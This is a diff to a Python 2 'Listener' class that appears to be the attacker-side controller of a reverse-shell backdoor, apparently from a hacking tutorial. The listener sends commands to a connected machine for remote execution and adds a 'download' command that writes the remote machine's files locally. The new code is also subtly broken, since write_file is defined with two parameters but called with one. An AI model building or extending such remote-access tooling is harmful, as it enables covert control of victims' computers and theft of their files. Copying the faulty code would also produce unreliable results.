@@ -34,7 +34,7 @@ class Listener:
                 continue
     
     def reliable_send(self, data):
-        #seralise data being sent in order to make sure
+        #seralise data being sent as json package in order to make sure
         #data arrives intact and pipe doesn't break
         json_data = json.dumps(data) #dumps - method to convert to json object
         self.connection.send(json_data)
@@ -47,7 +47,15 @@ class Listener:
             #so commands can be split from arguments
             #print(command)
             result = self.execute_remotely(command, buffer_size)
+            if command[0] == "download":
+                result = self.write_file(result)
             print(result)
+            
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Download successful."
+        
             
             
 listen_ip = raw_input("Enter IP Address to listen on: ")
